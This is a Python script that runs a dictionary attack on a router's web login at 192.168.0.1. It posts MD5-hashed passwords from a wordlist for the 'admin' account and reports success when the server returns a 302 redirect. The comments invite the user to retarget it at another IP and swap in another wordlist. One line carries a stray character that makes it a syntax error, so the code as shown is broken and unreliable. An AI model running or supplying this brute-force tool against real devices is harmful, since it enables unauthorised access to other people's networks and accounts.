import requests
import hashlib

def md5(x):
    return hashlib.md5(x.encode()).hexdigest()
#CHANGE THE IP
url = "http://192.168.0.1/login/Auth"
username = "admin"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.1",
    "Referer": "http://192.168.0.1/login.html"
}
#CHANGE THE WORDLIST.TXT
with open("wordlist.txt", encoding="latin-1") as f:
    for pw in f:
        pw = pw.strip()
        if not pw:S
            continue

        hashed_pw = md5(pw)
        session = requests.Session()

        try:
            r = session.post(url, data={
                "username": username,
                "password": hashed_pw
            }, headers=headers, timeout=5, allow_redirects=False)
        except Exception as e:
            print(f"[!] Error with {pw}: {e}")
            continue

        if r.status_code == 302 and "Location" in r.headers:
            print(f"[+] Password found: {pw} → MD5: {hashed_pw}")
            break
        else:
            print(f"[-] Tried: {pw}")
